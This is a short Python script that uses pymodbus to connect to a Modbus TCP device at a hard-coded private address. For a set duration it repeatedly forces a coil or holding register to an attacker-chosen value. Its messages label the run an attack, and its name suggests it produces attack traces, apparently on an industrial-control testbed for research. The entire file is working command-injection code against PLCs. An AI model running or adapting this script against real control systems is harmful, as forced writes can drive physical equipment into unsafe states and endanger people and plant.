# generate_traces_with_timestamp.py
#!/usr/bin/env python3

import sys
import time
from pymodbus.client import ModbusTcpClient as ModbusClient
from pymodbus.exceptions import ConnectionException

ip = "10.120.39.1"
client = ModbusClient(ip, port=502)
client.connect()
type = (str)(sys.argv[4])
target = (sys.argv[1])
value = (sys.argv[2])
duration = (int)(sys.argv[3])

print(f"{target} , {value} , {duration}")
try:
    if (type == "coil"): 
        address = 8*(int(target.split(".")[0])) + int(target.split(".")[1])
        start_time = time.time() 
        while time.time() - start_time < duration:
            client.write_coils(address, (bool)((int)(value)))
    elif (type == "register"):
        start_time = time.time()
        while time.time() - start_time < duration:
            client.write_register((int)(target), (int)(value))
    else:
        print("no type ")
except KeyboardInterrupt:
    # If Ctrl+C is pressed, clean up the GPIO settings
    print("Stopping attack ")
finally:
    print("Attack complete")


